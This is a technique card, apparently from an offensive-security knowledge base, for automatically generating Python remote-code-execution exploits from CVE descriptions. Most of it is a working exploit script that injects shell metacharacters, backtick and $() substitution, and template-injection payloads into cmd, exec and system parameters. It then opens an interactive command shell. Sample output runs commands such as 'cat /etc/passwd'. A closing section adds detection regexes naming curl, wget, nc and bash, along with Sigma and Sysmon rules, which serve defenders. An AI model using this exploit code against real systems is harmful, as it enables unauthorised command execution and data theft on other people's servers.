# Remote Code Execution (RCE) Exploit Generation

## Overview
- **Purpose**: Automatically generate Python exploit scripts for Remote Code Execution (RCE) vulnerabilities from CVE data
- **Category**: exploitation
- **Severity**: critical
- **Tags**: rce, remote-code-execution, command-injection, template-injection, exploit-generation, cve, T1059, T1190

## Context and Use-Cases
- Generate working RCE exploits from CVE descriptions
- Test multiple command injection vectors (semicolon, pipe, ampersand)
- Test template injection patterns (SSTI)
- Provide interactive shell for post-exploitation
- Useful for penetration testing, vulnerability validation, and security research
- Demonstrate critical impact through arbitrary command execution

## Key Parameters and Inputs
- **cve_data** (dict, required): CVE information including `cve_id`, `description`. Example: `{"cve_id": "CVE-2024-3456", "description": "Remote code execution via cmd parameter"}`
- **target_info** (dict, required): Target configuration. Example: `{"target_url": "http://target.com/api/exec"}`
- **details** (dict, optional): Additional vulnerability details. Example: `{}`

## Procedure
1. Parse CVE description to identify RCE vulnerability type
2. Generate Python exploit class with session management
3. Create `test_rce()` method with multiple injection techniques:
   - Command injection metacharacters (; | && ||)
   - Template injection patterns (${{}} {{}})
   - Backtick and $() command substitution
   - Deserialization-based RCE
4. Implement `_check_rce_indicators()` method to verify command execution
5. Implement `execute_command()` method for specific command execution
6. Add interactive shell loop for post-exploitation
7. Add command-line interface accepting target URL and optional command
8. Return complete exploit script with usage instructions

## Examples

### Generated Exploit Script Structure
```python
#!/usr/bin/env python3
# Remote Code Execution Exploit for CVE-2024-3456
# Vulnerability: Remote code execution via cmd parameter

import requests
import sys
import subprocess
from urllib.parse import quote

class RCEExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def test_rce(self, command="id"):
        """Test for RCE vulnerability"""
        print(f"[+] Testing RCE with command: {command}")
        
        # Common RCE payloads
        payloads = [
            # Command injection
            f"; {command}",
            f"| {command}",
            f"&& {command}",
            f"|| {command}",
            
            # Template injection
            f"${{{{{command}}}}}",
            f"{{{{{command}}}}}",
            
            # Deserialization payloads
            f"{command}",
            
            # OS command injection
            f"`{command}`",
            f"$({command})",
        ]
        
        for i, payload in enumerate(payloads):
            try:
                # Test GET parameters
                response = self.session.get(
                    self.target_url,
                    params={"cmd": payload, "exec": payload, "system": payload}
                )
                
                # Look for command output indicators
                if self._check_rce_indicators(response.text, command):
                    print(f"[+] RCE found with payload {i+1}: {payload}")
                    return True
                
                # Test POST data
                response = self.session.post(
                    self.target_url,
                    data={"cmd": payload, "exec": payload, "system": payload}
                )
                
                if self._check_rce_indicators(response.text, command):
                    print(f"[+] RCE found with POST payload {i+1}: {payload}")
                    return True
            
            except Exception as e:
                continue
        
        return False

    def _check_rce_indicators(self, response_text, command):
        """Check response for RCE indicators"""
        if command == "id":
            indicators = ["uid=", "gid=", "groups="]
        elif command == "whoami":
            indicators = ["root", "www-data", "apache", "nginx"]
        elif command == "pwd":
            indicators = ["/", "\\", "C:"]
        else:
            indicators = [command]
        
        return any(indicator in response_text for indicator in indicators)

    def execute_command(self, command):
        """Execute a specific command"""
        print(f"[+] Executing command: {command}")
        
        if self.test_rce(command):
            print(f"[+] Command executed successfully")
            return True
        else:
            print(f"[-] Command execution failed")
            return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url> [command]")
        print(f"Example: python3 {sys.argv[0]} http://target.com id")
        sys.exit(1)
    
    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"
    
    exploit = RCEExploit(target_url)
    
    print(f"[+] RCE Exploit for CVE-2024-3456")
    print(f"[+] Target: {target_url}")
    
    if exploit.test_rce(command):
        print("[+] RCE vulnerability confirmed!")
        
        # Interactive shell
        while True:
            try:
                cmd = input("RCE> ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                if cmd:
                    exploit.execute_command(cmd)
            except KeyboardInterrupt:
                break
    else:
        print("[-] No RCE vulnerability found")

if __name__ == "__main__":
    main()
```

### Usage Examples

**Basic RCE Testing**
```bash
python3 rce_exploit.py http://target.com/api/exec id

# Output:
# [+] RCE Exploit for CVE-2024-3456
# [+] Target: http://target.com/api/exec
# [+] Testing RCE with command: id
# [+] RCE found with payload 1: ; id
# [+] RCE vulnerability confirmed!
# RCE> 
```

**Interactive Shell Session**
```bash
python3 rce_exploit.py http://target.com/exec whoami

# Output:
# [+] RCE vulnerability confirmed!
# RCE> whoami
# [+] Executing command: whoami
# [+] Command executed successfully
# RCE> pwd
# [+] Executing command: pwd
# [+] Command executed successfully
# RCE> cat /etc/passwd
# [+] Executing command: cat /etc/passwd
# [+] Command executed successfully
# RCE> exit
```

**Template Injection**
```bash
# Testing Server-Side Template Injection (SSTI)
python3 rce_exploit.py http://target.com/render "{{7*7}}"

# Payload will test: ${{{{7*7}}}} and {{{{7*7}}}}
```

## Indicators / Detection

### Log Sources
- Web server access logs
- Web Application Firewall (WAF) logs
- System process execution logs (auditd, Sysmon)
- Network IDS/IPS logs

### Detection Patterns

**WAF/IDS Rules (Regex)**
```regex
# Command injection metacharacters
[;&|`$]\s*(cat|ls|id|whoami|wget|curl|nc|bash|sh|cmd|powershell)

# Template injection
\$\{\{.*\}\}|\{\{.*\}\}

# Command substitution
`[^`]+`|\$\([^\)]+\)
```

**Splunk Query**
```spl
index=web_logs 
| regex _raw="(?i)(;|\\||&&|`|\\$\\(|\\$\\{\\{).*(cat|ls|id|whoami|wget|curl|bash|sh|cmd|powershell)"
| stats count by src_ip, uri, query_string, user_agent
| where count > 2
```

**Sigma Rule - Web Server Spawning Shell**
```yaml
title: Web Server Process Spawning Shell
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith:
      - '/httpd'
      - '/nginx'
      - '/apache2'
      - '/java'
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
  condition: selection
level: critical
```

**Sysmon Event - Command Execution from Web Process**
```xml
<RuleGroup name="RCE Detection">
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">w3wp.exe</ParentImage>
    <ParentImage condition="end with">httpd.exe</ParentImage>
    <Image condition="end with">cmd.exe</Image>
    <Image condition="end with">powershell.exe</Image>
  </ProcessCreate>
</RuleGroup>
```


## Limitations and Caveats

- **Output Detection**: Relies on command output appearing in HTTP response; blind RCE scenarios require out-of-band detection
- **Command Indicators**: Simple string matching may miss encoded or obfuscated output
- **Interactive Shell**: Requires stable network connection; may timeout on slow networks
- **WAF Bypass**: Basic payloads may be blocked; advanced obfuscation not included
- **Context-Specific**: Payloads may need adjustment based on injection context (shell, template, eval)
- **Error Handling**: May not detect RCE if application suppresses errors
- **Authentication**: Does not handle authenticated endpoints requiring valid sessions
- **Rate Limiting**: Aggressive testing may trigger rate limits or account lockouts

## Source Excerpts

### [S1] RCE Vulnerability Detection
```python
# From exploit_template.py lines 343-345
# RCE detection
elif any(keyword in description_lower for keyword in ["remote code execution", "rce", "command injection"]):
    vuln_type = "rce"
```

### [S2] RCE Exploit Generation Method
```python
# From exploit_template.py lines 938-1064
def _generate_rce_exploit(self, cve_data, target_info, details):
    """Generate RCE exploit based on CVE details"""
    cve_id = cve_data.get("cve_id", "")
    
    return f'''#!/usr/bin/env python3
# Remote Code Execution Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

import requests
import sys
import subprocess
from urllib.parse import quote

class RCEExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
    
    def test_rce(self, command="id"):
        """Test for RCE vulnerability"""
        print(f"[+] Testing RCE with command: {{command}}")
        
        # Common RCE payloads
        payloads = [
            # Command injection
            f"; {{command}}",
            f"| {{command}}",
            f"&& {{command}}",
            f"|| {{command}}",
            
            # Template injection
            f"${{{{{{command}}}}}}",
            f"{{{{{{command}}}}}}",
            
            # Deserialization payloads
            f"{{command}}",
            
            # OS command injection
            f"`{{command}}`",
            f"$({{command}})",
        ]
```

### [S3] Command Output Verification
```python
# From exploit_template.py lines 1008-1030
def _check_rce_indicators(self, response_text, command):
    """Check response for RCE indicators"""
    if command == "id":
        indicators = ["uid=", "gid=", "groups="]
    elif command == "whoami":
        indicators = ["root", "www-data", "apache", "nginx"]
    elif command == "pwd":
        indicators = ["/", "\\\\", "C:"]
    else:
        indicators = [command]
    
    return any(indicator in response_text for indicator in indicators)

def execute_command(self, command):
    """Execute a specific command"""
    print(f"[+] Executing command: {{command}}")
    
    if self.test_rce(command):
        print(f"[+] Command executed successfully")
        return True
    else:
        print(f"[-] Command execution failed")
        return False
```

